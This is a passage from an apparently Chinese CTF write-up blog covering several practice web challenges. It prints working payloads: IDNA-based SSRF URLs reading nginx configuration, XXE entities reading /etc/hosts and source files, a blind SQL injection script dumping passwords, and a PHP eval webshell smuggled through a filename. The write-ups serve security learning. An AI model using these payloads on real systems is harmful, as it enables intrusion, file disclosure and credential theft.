string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname <span class="token comment">#è§£æå‡ºä¸»æœºå</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æˆ‘æ‰Œ your problem? 111"</span>    parts <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment">#å†æ¬¡è§£æä¸»æœºå</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æˆ‘æ‰Œ your problem? 222 "</span> <span class="token operator">+</span> host    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#å¯¹www.example.comæŒ‰.åˆ’åˆ†ï¼Œå…ˆæŒ‰idnaç¼–ç ï¼Œå†utf-8è§£ç </span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span> <span class="token comment">#ç»„åˆå¥½è§£ç åçš„ä¸»æœºå</span>    <span class="token comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname <span class="token comment">#è§£æå‡ºä¸»æœºåï¼Œè¦ç­‰äºsuctf.cc</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"æˆ‘æ‰Œ your problem? 333"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æä¸ªè„šæœ¬å°è¯•è·‘å‡ºæœ€åçš„cä¸­ä»¥idnaç¼–ç åå†ç»è¿‡utf8ç¼–ç ç»“æœä¸ºCçš„å†…å®¹</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">65537</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> tmp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> res<span class="token operator">==</span><span class="token string">"c"</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»“æœï¼š</p><pre class="line-numbers language-none"><code class="language-none">â„‚â„­â…­â…½â’¸â“’ï¼£ï½ƒ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éšä¾¿æ‹ä¸€ä¸ªæ„é€ payloadï¼Œé¢˜ä¸­æç¤ºäº†ä½¿ç”¨äº†nginxï¼Œå°è¯•è®¿é—®é»˜è®¤nginxé…ç½®æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š&#x2F;etc&#x2F;nginxä¸»è¦é…ç½®æ–‡ä»¶ï¼š&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.confç®¡ç†è„šæœ¬ï¼š&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.serviceæ¨¡å—ï¼š&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modulesåº”ç”¨ç¨‹åºï¼š&#x2F;usr&#x2F;sbin&#x2F;nginxç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;htmlæ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š&#x2F;var&#x2F;log&#x2F;nginxNginxé…ç½®æ–‡ä»¶ï¼š&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;suctf.câ„‚&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">server &#123;    listen 80;    location &#x2F; &#123;        try_files $uri @app;    &#125;    location @app &#123;        include uwsgi_params;        uwsgi_pass unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;uwsgi.sock;    &#125;    location &#x2F;static &#123;        alias &#x2F;app&#x2F;static;    &#125;    # location &#x2F;flag &#123;    #     alias &#x2F;usr&#x2F;fffffflag;    # &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥çœ‹flagå³å¯</p><pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F;suctf.câ„‚&#x2F;usr&#x2F;fffffflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>åˆä¸€ä¸ªXXEï¼Œå…ˆå°è¯•ä¸€ä¸‹ç›´æ¥è¯»flagå§</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY abc SYSTEM "file:///flag"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&abc;">&amp;abc;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>emmmmmmæ–‡ä»¶ä¼¼ä¹ä¸å­˜åœ¨ï¼Œå†å°è¯•è¯»å–ç½‘ç«™æºç ï¼Œè¿”å›0æ²¡æœ‰å†…å®¹ï¼Œå†è¯•è¯•PHPä¼ªåè®®</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY abc SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&abc;">&amp;abc;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*** autor: c0ny1* date: 2018-2-7*/</span><span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//è´¦å·</span><span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment">//å¯†ç </span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ç©æ¥ä¹Ÿå¦¹å•¥ç”¨å•Š</p><p>çœ‹çœ‹wpï¼Œæ‹“å±•XXEæ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨ä»»æ„æ–‡ä»¶è¯»å–çš„ç‰¹æ€§æ¥æ¢æµ‹å†…ç½‘å­˜æ´»ä¸»æœºï¼Œè·å–/etc/hostsæ–‡ä»¶ï¼Œæˆ‘ä»¬åˆ†åˆ«è¯»å–å…³é”®æ–‡ä»¶ï¼š**/etc/hosts å’Œ /proc/net/arpï¼š**</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY abc SYSTEM "file:///etc/hosts"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&abc;">&amp;abc;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-05">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-05</a> 19.29.23.png)</p><p>æ‰¾åˆ°å†…ç½‘ä¸­IPï¼Œå°è¯•åœ¨ipæœ«å°¾çˆ†ç ´ï¼Œå‡ºflag</p><p><del>ä¹Ÿä¸çŸ¥é“æˆ‘è¿™ä¸ªç¯å¢ƒæœ‰å•¥é—®é¢˜å°±æ˜¯è·‘ä¸å‡ºæ¥ï¼Œä»¥åå†è¯•è¯•</del></p><h2 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h2><p>robots.txt</p><pre class="line-numbers language-none"><code class="language-none">Disallow: *.php.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿åˆ°image.phpæºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"select * from images where id='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>' or path='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$path</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token string double-quoted-string">"./"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥çœ‹æºç ï¼Œå‘ç°ä¼ å…¥çš„idå’Œpathéƒ½å°†å˜é‡ç»è¿‡addslashesè½¬æ¢åçš„<code>\0,%00,\&#39;,&#39;</code>æ›¿æ¢ä¸ºç©º</p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚æœä¼ å…¥\\0ï¼Œå‰ä¸¤ä¸ªåæ–œæ ç”±äºè½¬ä¹‰ï¼Œç»“æœæ˜¯\0ï¼Œç»è¿‡addslasheså˜ä¸º\\0ï¼Œå†ç»è¿‡str_replaceå˜ä¸º\ï¼Œæ­¤æ—¶æ•´ä¸ªsqlè¯­å¥å˜ä¸º</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from images where id&#x3D;&#39;\&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ‘ä»¬å°±å¯ä»¥åœ¨pathå¤„è¿›è¡Œsqlæ³¨å…¥</p><pre class="line-numbers language-none"><code class="language-none">tables:images,users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">r"http://3658d7dc-a0eb-4cb0-a891-f66217ffe401.node4.buuoj.cn:81/image.php?id=\\0&amp;path=or id="</span>name<span class="token operator">=</span><span class="token string">'admin1234567890,qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> name<span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"if((ascii(substr((select group_concat(password)from users),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">),1,0)--+"</span></span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"JFIF"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨usersè¡¨ä¸­è·å¾—ç”¨æˆ·åå’Œå¯†ç <code>admin:157aeccdaba2cf3324cf</code></p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-06">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-06</a> 21.43.40.png)</p><p>å°è¯•ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œæ˜¾ç¤ºä¸å…è®¸ä¸Šä¼ phpæ–‡ä»¶ï¼Œä¸Šä¼ ä»»æ„æ–‡ä»¶å°è¯•ï¼Œå¾—åˆ°æç¤º</p><pre class="line-numbers language-none"><code class="language-none">I logged the file name you uploaded to logs&#x2F;upload.b6acf587d3c1a6ea213bf45c8c143b95.log.php.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°†æ–‡ä»¶åå†™å…¥log.phpæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶åå¤„å°è¯•æ„é€ æœ¨é©¬ï¼Œè¿˜æ˜¯æç¤ºä¸èƒ½ä¸Šä¼ ï¼Œçœ‹æ¥åœ¨æ–‡ä»¶åå¤„å¯¹phpè¿›è¡Œäº†è¿‡æ»¤ï¼Œå°è¯•çŸ­æ ‡ç­¾ç»•è¿‡æˆåŠŸ</p><pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; eval($_POST[&#39;kkk&#39;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‹¿flag</p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>è¿›å…¥é¡µé¢å‘ç°æœ‰ä¸€ä¸ªç™»å½•ä¸€ä¸ªæ³¨å†Œï¼Œæ€€ç–‘æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œå°è¯•åœ¨ç”¨æˆ·åä¸­åŠ å…¥å•åŒå¼•å·æµ‹è¯•ï¼Œæ³¨å†ŒæˆåŠŸä½†æ˜¯ç™»å½•å¤±è´¥ï¼Œçœ‹çœ‹wpï¼Œä½¿ç”¨åæ–œæ è¿›è¡Œæµ‹è¯•ï¼Œåœ¨ä¿®æ”¹å¯†ç å¤„æµ‹è¯•æˆåŠŸï¼ŒæŠ¥é”™å›æ˜¾</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-06">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-06</a> 21.58.42.png)</p><h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];    &#125;    echo $_SERVER[&quot;REMOTE_ADDR&quot;];    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);    @mkdir($sandbox);    @chdir($sandbox);    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[&quot;basename&quot;]), $data);    highlight_file(__FILE__);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸¤çœ¼ä¸€è’™ï¼Œç›´æ¥<a href="https://blog.csdn.net/qq_49422880/article/details/121430262">wp</a>ï¼Œæ˜¯æ–°çŸ¥è¯†è€¶</p><blockquote><p>é¢˜ç›®çš„æ„æ€æ˜¯å…ˆä»¥MD5(orange .ip)ç”Ÿæˆä¸€ä¸ªhash,æ”¾åœ¨sandboxä¹‹ä¸‹ï¼Œç„¶åä½¿ç”¨GETå‘½ä»¤è¿›è¡Œè®¿é—®ï¼Œé‚£é‡Œå°±å¯ä»¥ä½¿ç”¨perl 